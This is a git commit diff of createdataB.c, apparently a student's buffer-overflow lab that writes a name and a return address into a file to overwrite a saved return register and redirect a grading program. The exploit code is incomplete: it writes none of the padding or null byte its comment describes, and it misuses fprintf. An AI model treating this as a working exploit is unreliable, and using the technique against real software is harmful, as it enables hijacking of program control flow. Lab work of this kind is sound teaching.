ddcf3cf76c806154f7b1e1947343a43dab74c50d
Chinmay Bhandaru <praneethsbhandaru@gmail.com>
2023-11-29 15:42:53 -0500

    feat: trying to createdataB.c

--- createdataB.c
+++ createdataB.c
@@ -1,37 +1,32 @@
-/*--------------------------------------------------------------------*/
-/* createdataB.c
-/* Author: Praneeth Bhandaru
-/*
-/* Produces a file called dataB with the student name, a nullbyte,
-/* padding to overrun the stack, and the address of the instruction in
-/* main to get a B, the latter of which will overwrite getName's stored
-/* x30.
-/*--------------------------------------------------------------------*/
+/*----------------------------------------------------------------------
+ * createdataB.c
+ * Author: Praneeth Bhandaru
+ *
+ * Produces a file called dataB with the student name, a nullbyte,
+ * padding to overrun the stack, and the address of the instruction in
+ * main to get a B, the latter of which will overwrite getName's stored
+ * x30.
+----------------------------------------------------------------------*/
 
 
 #include <stdio.h>
 #include <stdlib.h>
 
-const static unsigned long lReturnAddress = 0x400890;
+static const unsigned int lReturnAddress = 0x00400890;
+static const char sName[] = "Chinmay Bhandaru";
 
-int main(int argc, char *argv[]) {
-    char *pcName;
-    char *pcAddress;
-    int i;
+int main(void) {
 
-    if (argc != 2) {
-        fprintf(stderr, "Usage: %s <name>\n", argv[0]);
-        exit(EXIT_FAILURE);
+    FILE *psFile = fopen("dataB", "w");
+    if (psFile == NULL) {
+        printf("Error opening file\n");
+        return 1;
     }
 
-    pcName = argv[1];
-    pcAddress = calloc(sizeof(lReturnAddress) + 1, sizeof(char));
-    for (i = 0; i < sizeof(unsigned long); i++) {
-        pcAddress[i] = (lReturnAddress & (0x6F << (i * 3))) ;
-    }
+    fprintf(psFile, sName);
+    fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);
 
-    printf("%s", pcName);
-    printf("%s", pcAddress);
+    fclose(psFile);
 
     return 0;
 }
